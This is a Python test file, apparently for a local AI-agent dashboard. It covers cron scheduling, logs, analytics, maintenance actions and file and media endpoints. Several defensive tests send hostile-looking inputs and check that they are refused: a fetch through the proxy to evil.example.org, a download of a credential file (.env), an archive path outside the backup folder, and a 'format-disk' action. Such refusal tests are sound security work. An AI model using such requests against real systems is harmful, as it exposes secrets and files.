        async with serving(seed="demo") as (fake, base):
            async with signed_in(base) as http:
                everything = (await http.get("/api/cron/jobs")).json()
                default = (await http.get("/api/cron/jobs", params={"profile": "default"})).json()
                research = (await http.get("/api/cron/jobs", params={"profile": "research"})).json()
                bad_profile = await http.get("/api/cron/jobs", params={"profile": "Not A Name"})
                ids = {j["name"]: j["id"] for j in everything}
                one = (await http.get(f"/api/cron/jobs/{ids['Morning briefing']}",
                                      params={"profile": "research"})).json()
                by_name = (await http.get("/api/cron/jobs/daily digest")).json()
                missing = await http.get("/api/cron/jobs/nope")
                runs = {name: (await http.get(f"/api/cron/jobs/{ids[name]}/runs")).json()
                        for name in ("Morning briefing", "Daily digest", "Disk check", "Weekly review")}
                created = (await http.post("/api/cron/jobs", params={"profile": "research"}, json={
                    "prompt": "Check the inbox", "schedule": "every monday 9am", "name": "Inbox",
                    "deliver": "local"})).json()
                schedules = {s: (await http.post("/api/cron/jobs", json={"prompt": "p", "schedule": s})).json()
                             for s in ("30m", "every 2h", "in 45m", "0 9 * * 1-5", "weekdays at 9:30am")}
                refused = {label: (await http.post("/api/cron/jobs", json=body)) for label, body in {
                    "schedule": {"prompt": "p", "schedule": "whenever"},
                    "empty": {"prompt": "", "schedule": "30m"},
                    "no script": {"prompt": "", "schedule": "30m", "no_agent": True},
                    "repeat": {"prompt": "p", "schedule": "30m", "repeat": 0},
                    "missing": {"prompt": "p"},
                    "past": {"prompt": "p", "schedule": "2020-01-01T09:00:00"},
                }.items()}
                updated = (await http.put(f"/api/cron/jobs/{created['id']}", json={"updates": {
                    "schedule": "0 7 * * *", "name": "Inbox (early)", "model": "  "}})).json()
                bad_update = await http.put(f"/api/cron/jobs/{created['id']}", json={"updates": {"schedule": "nope"}})
                paused = (await http.post(f"/api/cron/jobs/{created['id']}/pause")).json()
                resumed = (await http.post(f"/api/cron/jobs/{created['id']}/resume")).json()
                sessions_before = len(fake.sessions)
                triggered = (await http.post(f"/api/cron/jobs/{created['id']}/trigger")).json()
                new_runs = (await http.get(f"/api/cron/jobs/{created['id']}/runs")).json()["runs"]
                listed = (await http.get("/api/profiles/sessions", params={"profile": "research", "limit": 50})).json()
                disk = (await http.post(f"/api/cron/jobs/{ids['Disk check']}/trigger")).json()
                disk_runs = (await http.get(f"/api/cron/jobs/{ids['Disk check']}/runs",
                                            params={"limit": 2})).json()
                deleted = (await http.delete(f"/api/cron/jobs/{created['id']}")).json()
                deleted_again = await http.delete(f"/api/cron/jobs/{created['id']}")
                targets = (await http.get("/api/cron/delivery-targets")).json()["targets"]
                research_targets = (await http.get("/api/cron/delivery-targets",
                                                   params={"profile": "research"})).json()["targets"]
                blueprints = (await http.get("/api/cron/blueprints", params={"profile": "default"})).json()
                instantiated = (await http.post("/api/cron/blueprints/instantiate", params={"profile": "default"},
                                                json={"blueprint": "weekly-review",
                                                      "values": {"time": "17:30", "day": "friday"}})).json()
                slot_error = await http.post("/api/cron/blueprints/instantiate",
                                             json={"blueprint": "weekly-review", "values": {"tiem": "07:15"}})
                no_blueprint = await http.post("/api/cron/blueprints/instantiate", json={"blueprint": "nope"})
                async with httpx.AsyncClient(base_url=f"http://{base}") as scheduler:
                    fire = {label: await scheduler.post("/api/cron/fire", headers=headers, json=body)
                            for label, (headers, body) in {
                                "no token": ({}, {"job_id": ids["Daily digest"]}),
                                "no job": ({"authorization": f"Bearer {CRON_FIRE_TOKEN}"}, {}),
                                "gone": ({"authorization": f"Bearer {CRON_FIRE_TOKEN}"}, {"job_id": "deadbeef"}),
                                "fired": ({"authorization": f"Bearer {CRON_FIRE_TOKEN}"},
                                          {"job_id": ids["Daily digest"]}),
                            }.items()}
                digest_runs = (await http.get(f"/api/cron/jobs/{ids['Daily digest']}/runs")).json()["runs"]
        return (everything, default, research, bad_profile, ids, one, by_name, missing, runs, created, schedules,
                refused, updated, bad_update, paused, resumed, sessions_before, triggered, new_runs, listed, disk,
                disk_runs, deleted, deleted_again, targets, research_targets, blueprints, instantiated, slot_error,
                no_blueprint, fire, digest_runs, len(fake.sessions))

    (everything, default, research, bad_profile, ids, one, by_name, missing, runs, created, schedules, refused,
     updated, bad_update, paused, resumed, sessions_before, triggered, new_runs, listed, disk, disk_runs, deleted,
     deleted_again, targets, research_targets, blueprints, instantiated, slot_error, no_blueprint, fire,
     digest_runs, sessions_after) = asyncio.run(scenario())
    assert [j["name"] for j in default] == ["Morning briefing", "Daily digest", "Disk check", "Weekly review"]
    assert [j["name"] for j in research] == ["arXiv watch"] and len(everything) == 5
    briefing = default[0]
    assert briefing["schedule"] == {"kind": "cron", "expr": "0 8 * * *", "display": "0 8 * * *"}
    assert briefing["deliver"] == "telegram" and briefing["skills"] == ["google-workspace"]
    assert briefing["profile"] == briefing["profile_name"] == "default" and briefing["is_default_profile"]
    assert briefing["latest_execution"]["status"] == "completed" and briefing["next_run_at"].endswith(
        briefing["next_run_at"][-6:])
    assert set(briefing) >= {"id", "name", "prompt", "schedule_display", "repeat", "enabled", "state", "next_run_at",
                             "last_run_at", "last_status", "last_error", "hermes_home", "scheduler_heartbeat_age_s"}
    disk_job = default[2]
    assert disk_job["state"] == "paused" and not disk_job["enabled"] and disk_job["no_agent"]
    assert disk_job["paused_reason"] == "Paused from the dashboard" and disk_job["schedule"]["kind"] == "interval"
    assert default[3]["last_status"] == "error" and "DISCORD_HOME_CHANNEL" in default[3]["last_error"]
    assert bad_profile.status_code == 400
    assert one["name"] == "Morning briefing" and one["profile"] == "default", "a wrong-profile hint still finds it"
    assert "latest_execution" not in one and by_name["name"] == "Daily digest"
    assert missing.status_code == 404 and missing.json() == {"detail": "Job not found"}
    briefing_run = runs["Morning briefing"]["runs"][0]
    assert briefing_run["id"].startswith(f"cron_output:{ids['Morning briefing']}:exec:"), \
        "--seed demo: a past run without its chat is a ledger row"
    assert briefing_run["title"] == "COMPLETED · Script-only run" and briefing_run["source"] == "cron_output"
    digest_run = runs["Daily digest"]["runs"][0]
    assert digest_run["title"] == "Daily digest" and digest_run["source"] == "cron" and digest_run[
        "cron_job_id"] == ids["Daily digest"], "the demo's cron chat is the digest's run"
    assert [r["title"] for r in runs["Disk check"]["runs"]][0] == "COMPLETED · Disk usage: 61% of 460 GB used."
    assert runs["Weekly review"]["runs"][0]["title"] == \
        "FAILED · Discord home channel is not set (DISCORD_HOME_CHANNEL)"
    assert runs["Disk check"]["limit"] == 20
    assert created["profile"] == "research" and created["schedule"]["expr"] == "0 9 * * 1"
    assert created["state"] == "scheduled" and created["next_run_at"] and created["repeat"] == {"times": None,
                                                                                                "completed": 0}
    assert schedules["30m"]["schedule"] == {"kind": "interval", "minutes": 30, "display": "every 30m"}
    assert schedules["every 2h"]["schedule"]["minutes"] == 120
    assert schedules["in 45m"]["schedule"]["kind"] == "once" and schedules["in 45m"]["repeat"]["times"] == 1
    assert schedules["0 9 * * 1-5"]["schedule"]["kind"] == "cron"
    assert schedules["weekdays at 9:30am"]["schedule"]["expr"] == "30 9 * * 1-5"
    assert refused["schedule"].status_code == 400 and refused["schedule"].json()["detail"].startswith(
        "Invalid schedule 'whenever'. Use:")
    assert refused["empty"].json() == {"detail": "agent cron jobs require a prompt, skill, or script"}
    assert refused["no script"].json() == {"detail": "no_agent=True requires a script"}
    assert refused["repeat"].json() == {"detail": "repeat must be a positive integer"}
    assert refused["missing"].status_code == 422 and "past" in refused["past"].json()["detail"]
    assert updated["name"] == "Inbox (early)" and updated["schedule"]["expr"] == "0 7 * * *"
    assert updated["model"] is None and bad_update.status_code == 400
    assert paused["state"] == "paused" and not paused["enabled"] and paused["paused_at"]
    assert resumed["state"] == "scheduled" and resumed["enabled"] and resumed["paused_reason"] is None
    assert triggered["last_status"] == "ok" and triggered["repeat"]["completed"] == 1
    assert triggered["next_run_at"] == resumed["next_run_at"], "a manual run leaves next_run_at alone"
    assert len(new_runs) == 1 and new_runs[0]["source"] == "cron" and new_runs[0]["profile"] == "research"
    assert new_runs[0]["id"] in {r["id"] for r in listed["sessions"]}, "the run is a chat the app can open"
    assert disk["state"] == "paused" and disk["last_status"] == "ok", "a paused job runs on demand"
    assert len(disk_runs["runs"]) == 2 and disk_runs["runs"][0]["title"].startswith("COMPLETED · Disk usage: ")
    assert deleted == {"ok": True} and deleted_again.status_code == 404
    assert [t["id"] for t in targets] == ["local", "telegram", "discord", "bot-chat:default", "bot-chat:research"]
    assert targets[0] == {"id": "local", "name": "Local (save only)", "home_target_set": True, "home_env_var": None}
    assert targets[2] == {"id": "discord", "name": "Discord", "home_target_set": False,
                          "home_env_var": "DISCORD_HOME_CHANNEL"}
    assert [t["id"] for t in research_targets] == ["local", "bot-chat:default", "bot-chat:research"]
    weekly = next(b for b in blueprints["blueprints"] if b["key"] == "weekly-review")
    assert weekly["scheduleHuman"] == "sunday at 18:00" and weekly["source"] == "builtin"
    assert weekly["fields"][2]["options"] == ["origin", "local", "telegram", "discord", "bot-chat:default",
                                              "bot-chat:research"] and weekly["fields"][2]["strict"] is False
    assert weekly["command"] == "/blueprint weekly-review time=18:00 day=sunday deliver=origin"
    assert weekly["appUrl"] == "hermes://blueprint/weekly-review?time=18%3A00&day=sunday&deliver=origin"
    assert instantiated["name"] == "Weekly review" and instantiated["schedule"]["expr"] == "30 17 * * 5"
    assert instantiated["skills"] == ["weekly-review-planning"] and instantiated["deliver"] == "origin"
    assert slot_error.status_code == 422 and slot_error.json()["detail"].startswith("unknown slot: tiem")
    assert no_blueprint.status_code == 404
    assert fire["no token"].status_code == 401 and fire["no token"].json() == {"error": "invalid fire token"}
    assert fire["no job"].json() == {"error": "missing job_id"}
    assert fire["gone"].json() == {"status": "gone", "job_id": "deadbeef"}
    assert fire["fired"].status_code == 202 and fire["fired"].json()["status"] == "accepted"
    assert len(digest_runs) == 2, "the fired run joined the history"
    assert sessions_after == sessions_before + 2, "the trigger and the fire each left a cron chat"


def test_command_center_status_logs_and_analytics():
    async def scenario():
        async with serving(seed="demo") as (fake, base):
            async with httpx.AsyncClient(base_url=f"http://{base}") as anonymous:
                health = (await anonymous.get("/api/health")).json()
                stats_anonymous = await anonymous.get("/api/system/stats")
                audio = await anonymous.get("/api/audio/voice-config")
            async with signed_in(base) as http:
                stats = (await http.get("/api/system/stats")).json()
                logs = (await http.get("/api/logs")).json()
                errors_only = (await http.get("/api/logs", params={"level": "ERROR"})).json()
                gateway_logs = (await http.get("/api/logs", params={"file": "gateway", "component": "gateway",
                                                                  "lines": 2})).json()
                searched = (await http.get("/api/logs", params={"search": "PYTEST"})).json()
                no_file = await http.get("/api/logs", params={"file": "secrets"})
                no_component = await http.get("/api/logs", params={"component": "kernel"})
                empty_file = (await http.get("/api/logs", params={"file": "desktop"})).json()
                usage = (await http.get("/api/analytics/usage", params={"days": 7})).json()
                usage_90 = (await http.get("/api/analytics/usage", params={"days": 90})).json()
                bad_days = await http.get("/api/analytics/usage", params={"days": 0})
                models = (await http.get("/api/analytics/models")).json()
                audio_signed_in = await http.get("/api/audio/speak")
        async with serving() as (fake, base):
            async with signed_in(base) as http:
                empty_usage = (await http.get("/api/analytics/usage", params={"profile": "research"})).json()
        return (health, stats_anonymous, audio, stats, logs, errors_only, gateway_logs, searched, no_file,
                no_component, empty_file, usage, usage_90, bad_days, models, audio_signed_in, empty_usage)

    (health, stats_anonymous, audio, stats, logs, errors_only, gateway_logs, searched, no_file, no_component,
     empty_file, usage, usage_90, bad_days, models, audio_signed_in, empty_usage) = asyncio.run(scenario())
    assert health["ok"] and health["auth_required"] and set(health) == {"ok", "version", "displayVersion", "commit",
                                                                         "auth_required"}
    assert stats_anonymous.status_code == 401
    assert audio.status_code == 404 and audio_signed_in.status_code == 404, "never /api/audio/*"
    assert stats["psutil"] and stats["cpu_count"] == 8 and set(stats["memory"]) == {"total", "available", "used",
                                                                                     "percent"}
    assert set(stats) >= {"os", "os_release", "platform", "arch", "hostname", "hermes_version", "disk", "load_avg",
                          "uptime_seconds", "process"}
    assert logs["file"] == "agent" and all(line.endswith("\n") for line in logs["lines"])
    assert " INFO run_agent: Turn started" in logs["lines"][0]
    assert errors_only["lines"] and all(" ERROR " in line for line in errors_only["lines"])
    assert len(gateway_logs["lines"]) == 2 and all(" gateway" in line or " hermes_plugins" in line
                                                   for line in gateway_logs["lines"])
    assert len(searched["lines"]) == 1 and "pytest" in searched["lines"][0], "search ignores case"
    assert no_file.json() == {"detail": "Unknown log file: secrets"}
    assert no_component.json()["detail"].startswith("Unknown component: kernel. Available: agent, cli, cron")
    assert empty_file == {"file": "desktop", "lines": []}
    assert set(usage) == {"daily", "by_model", "by_task", "totals", "period_days", "skills", "tools"}
    assert usage["period_days"] == 7 and 1 <= len(usage["daily"]) <= 8
    assert set(usage["daily"][0]) == {"day", "input_tokens", "output_tokens", "cache_read_tokens", "reasoning_tokens",
                                      "estimated_cost", "actual_cost", "sessions", "api_calls"}
    assert usage_90["totals"]["total_sessions"] > usage["totals"]["total_sessions"] > 0
    assert {m["model"] for m in usage_90["by_model"]} >= {"fake-hermes", "echo-2-pro"}
    assert usage_90["skills"]["summary"]["distinct_skills_used"] > 0 and usage_90["tools"][0]["percentage"] > 0
    assert set(usage_90["by_task"][0]) == {"task", "input_tokens", "output_tokens", "estimated_cost", "api_calls",
                                           "models"}
    assert bad_days.status_code == 422 and bad_days.json()["detail"][0]["loc"] == ["query", "days"]
    card = models["models"][0]
    assert set(card) == {"model", "provider", "input_tokens", "output_tokens", "cache_read_tokens",
                         "reasoning_tokens", "estimated_cost", "actual_cost", "sessions", "api_calls", "tool_calls",
                         "last_used_at", "avg_tokens_per_session", "capabilities"}
    assert models["totals"]["distinct_models"] == len({m["model"] for m in models["models"]})
    assert empty_usage["totals"]["total_input"] is None and empty_usage["totals"]["total_sessions"] == 0, \
        "SUM over no rows is null"
    assert empty_usage["daily"] == [] and empty_usage["tools"] == []


def test_maintenance_actions_progress_over_polls_and_change_state():
    async def scenario():
        async with serving(seed="demo", action_seconds=0) as (fake, base):
            async with signed_in(base) as http:
                never = (await http.get("/api/actions/doctor/status")).json()
                unknown = await http.get("/api/actions/format-disk/status")
                doctor = (await http.post("/api/ops/doctor")).json()
                doctor_polls = await finish(http, "doctor")
                audit = (await http.post("/api/ops/security-audit", params={"profile": "research"})).json()
                await finish(http, "security-audit")
                backup = (await http.post("/api/ops/backup", json={})).json()
                early = await http.get("/api/ops/backup/download", params={"archive": backup["archive"]})
                await finish(http, "backup")
                download = await http.get("/api/ops/backup/download", params={"archive": backup["archive"]})
                elsewhere = await http.get("/api/ops/backup/download",
                                           params={"archive": "/home/demo/projects/atlas/src/atlas/auth.py"})
                other_profile = await http.get("/api/ops/backup/download",
                                               params={"archive": backup["archive"], "profile": "research"})
                no_archive = await http.get("/api/ops/backup/download")
                share = (await http.post("/api/ops/debug-share", json={"redact": True, "lines": 100})).json()
                checkpoints = (await http.get("/api/ops/checkpoints")).json()
                prune_unnamed = await http.post("/api/ops/checkpoints/prune")
                prune = (await http.post("/api/ops/checkpoints/prune", params={"profile": "default"})).json()
                await finish(http, "checkpoints-prune")
                checkpoints_after = (await http.get("/api/ops/checkpoints")).json()
                curator = (await http.get("/api/curator")).json()
                paused = (await http.put("/api/curator/paused", json={"paused": True})).json()
                run_unnamed = await http.post("/api/curator/run")
                run = (await http.post("/api/curator/run", params={"profile": "default"})).json()
                await finish(http, "curator-run")
                curator_after = (await http.get("/api/curator")).json()
                restart = (await http.post("/api/gateway/restart")).json()
                restart_again = (await http.post("/api/gateway/restart")).json()
                restart_polls = await finish(http, "gateway-restart")
                check = (await http.get("/api/hermes/update/check", params={"force": "true"})).json()
                update = (await http.post("/api/hermes/update")).json()
                update_again = (await http.post("/api/hermes/update")).json()
                update_polls = await finish(http, "hermes-update")
                check_after = (await http.get("/api/hermes/update/check")).json()
                tail = (await http.get("/api/actions/doctor/status", params={"lines": 2})).json()
        async with serving(seed="demo", action_seconds=0.1) as (fake, base):
            async with signed_in(base) as http:
                quick = (await http.post("/api/ops/doctor")).json()
                await asyncio.sleep(0.2)
                timed = (await http.get("/api/actions/doctor/status")).json()
        return (never, unknown, doctor, doctor_polls, audit, backup, early, download, elsewhere, other_profile,
                no_archive, share, checkpoints, prune_unnamed, prune, checkpoints_after, curator, paused, run_unnamed,
                run, curator_after, restart, restart_again, restart_polls, check, update, update_again, update_polls,
                check_after, tail, quick, timed)

    (never, unknown, doctor, doctor_polls, audit, backup, early, download, elsewhere, other_profile, no_archive,
     share, checkpoints, prune_unnamed, prune, checkpoints_after, curator, paused, run_unnamed, run, curator_after,
     restart, restart_again, restart_polls, check, update, update_again, update_polls, check_after, tail, quick,
     timed) = asyncio.run(scenario())
    assert never == {"name": "doctor", "running": False, "exit_code": None, "pid": None, "lines": []}
    assert unknown.status_code == 404 and unknown.json() == {"detail": "Unknown action: format-disk"}
    assert doctor["ok"] and doctor["name"] == "doctor" and doctor["pid"] > 0
    assert [p["running"] for p in doctor_polls] == [True, True, False]
    assert [p["exit_code"] for p in doctor_polls] == [None, None, 0]
    assert doctor_polls[0]["lines"][0] == "" and doctor_polls[0]["lines"][1].startswith("=== doctor started ")
    assert doctor_polls[-1]["lines"][-1] == "Summary: 5 passed, 1 warning, 0 failed"
    assert set(doctor_polls[0]) == {"name", "running", "exit_code", "pid", "lines"}
    assert audit["name"] == "security-audit"
    assert backup["archive"].startswith("/home/demo/.hermes/backups/hermes-backup-") and backup["name"] == "backup"
    assert early.status_code == 404, "the archive exists once the backup finished"
    assert download.status_code == 200 and download.headers["content-type"] == "application/zip"
    assert "attachment" in download.headers["content-disposition"]
    assert set(zipfile.ZipFile(io.BytesIO(download.content)).namelist()) == {"config.yaml", "SOUL.md",
                                                                             "skills/README.txt"}
    assert elsewhere.status_code == 403 and other_profile.status_code == 403 and no_archive.status_code == 422
    assert share["ok"] and set(share["urls"]) == {"Report", "agent.log", "gateway.log"}
    assert share["failures"] == [] and share["auto_delete_seconds"] == 21600
    assert len(checkpoints["sessions"]) == 3 and checkpoints["total_bytes"] == sum(
        s["bytes"] for s in checkpoints["sessions"]) and set(checkpoints["sessions"][0]) == {"session", "files",
                                                                                               "bytes"}
    assert prune_unnamed.status_code == 400 and "requires an explicit profile" in prune_unnamed.json()["detail"]
    assert prune["name"] == "checkpoints-prune" and len(checkpoints_after["sessions"]) == 1
    assert set(curator) == {"enabled", "paused", "interval_hours", "last_run_at", "min_idle_hours",
                            "stale_after_days", "archive_after_days"}
    assert paused == {"ok": True, "paused": True} and run_unnamed.status_code == 400 and run["name"] == "curator-run"
    assert curator_after["paused"] and curator_after["last_run_at"] > curator["last_run_at"]
    assert restart["name"] == "gateway-restart"
    assert restart_again["pid"] == restart["pid"], "a running restart is reused"
    assert restart_polls[-1]["lines"][-1] == "Gateway is healthy."
    assert check["update_available"] and check["behind"] == 3 and check["can_apply"] and check["install_method"] == \
        "git"
    assert [c["sha"] for c in check["commits"]] == ["9d2e41a", "51c07fe", "0be93c2"] and check["source_version"] == \
        "0.43.0"
    assert len(update["action_id"]) == 32 and update_again["already_running"] and update_again["action_id"] == \
        update["action_id"]
    assert update_polls[0]["receipt"]["outcome"] == "running" and "action_id" not in update_polls[0]
    last = update_polls[-1]
    assert last["exit_code"] == 0 and last["action_id"] == update["action_id"]
    assert last["lines"][-1] == f"=== hermes-update completed {update['action_id']} ==="
    assert last["receipt"]["outcome"] == "success" and last["receipt"]["post_version"] == "0.43.0"
    assert check_after == {"install_method": "git", "current_version": check["current_version"], "behind": 0,
                           "update_available": False, "can_apply": True, "update_command": "hermes update",
                           "message": "You're on the latest version."}
    assert len(tail["lines"]) == 2
    assert quick["name"] == "doctor" and timed["running"] is False and timed["exit_code"] == 0, \
        "--action-seconds finishes an action nobody polls"


def test_artifact_chats_and_the_files_they_point_at():
    async def scenario():
        async with serving(seed="full") as (fake, base):
            async with signed_in(base) as http:
                listed = (await http.get("/api/profiles/sessions", params={"limit": 100})).json()["sessions"]
                report = next(s for s in listed if s["title"] == "Q3 latency report")
                messages = (await http.get(f"/api/sessions/{report['id']}/messages")).json()["messages"]
                image = (await http.get("/api/fs/read-data-url", params={"path": ARTIFACT_IMAGE})).json()
                pdf = (await http.get("/api/fs/read-data-url", params={"path": ARTIFACT_PDF})).json()
                csv = await http.get("/api/fs/download", params={"path": ARTIFACT_CSV})
                media = (await http.get("/api/media", params={"path": ARTIFACT_IMAGE})).json()
                logo = f"https://{ARTIFACT_LINK_HOST}/fake-hermes/logo-draft.png"
                proxied = (await http.get("/api/media/proxy", params={"url": logo})).json()
                refused = {label: (await http.get(path, params=params)).status_code for label, (path, params) in {
                    "proxy host": ("/api/media/proxy", {"url": "https://evil.example.org/x.png"}),
                    "proxy scheme": ("/api/media/proxy", {"url": "ftp://x/y.png"}),
                    "missing": ("/api/fs/read-data-url", {"path": "/home/demo/nope.pdf"}),
                    "dir": ("/api/fs/read-data-url", {"path": "/home/demo/projects/atlas/reports"}),
                    "sensitive": ("/api/fs/download", {"path": "/home/demo/.hermes/.env"}),
                    "relative": ("/api/fs/download", {"path": "reports/q3.csv"}),
                    "no path": ("/api/fs/download", {}),
                }.items()}
                home = (await http.get("/api/fs/read-data-url", params={"path": "~/notes.md"})).json()
                research = (await http.get("/api/profiles/sessions",
                                           params={"profile": "research", "limit": 50})).json()["sessions"]
                cron_chats = [s["title"] for s in listed if s["source"] == "cron"]
        return (listed, messages, image, pdf, csv, media, proxied, refused, home, research, cron_chats)

    listed, messages, image, pdf, csv, media, proxied, refused, home, research, cron_chats = asyncio.run(scenario())
    titles = {s["title"] for s in listed}
    assert {"Q3 latency report", "Logo ideas", "Fix flaky login test"} <= titles
    final = messages[-1]["content"]
    assert final.startswith(f"MEDIA:{ARTIFACT_IMAGE}") and ARTIFACT_PDF in final and f"]({ARTIFACT_CSV})" in final
    assert "https://grafana.example.com/" in final
    assert any(m["tool_name"] == "write_file" and ARTIFACT_CSV in m["content"] for m in messages)
    assert image["dataUrl"].startswith("data:image/png;base64,")
    assert base64.b64decode(pdf["dataUrl"].split(",", 1)[1]).startswith(b"%PDF-")
    assert csv.headers["content-disposition"] == 'attachment; filename="q3-latency.csv"'
    assert csv.text.startswith("week,p50_ms,p99_ms")
    assert media["data_url"].startswith("data:image/png;base64,")
    assert proxied["data_url"].startswith("data:image/png;base64,")
    assert refused == {"proxy host": 403, "proxy scheme": 400, "missing": 404, "dir": 400, "sensitive": 403,
                       "relative": 400, "no path": 422}
    assert home["dataUrl"].startswith("data:text/markdown;base64,")
    assert "Attention heads figure" in {s["title"] for s in research}
    assert "Morning briefing" in cron_chats, "--seed full gives past cron runs their chats"
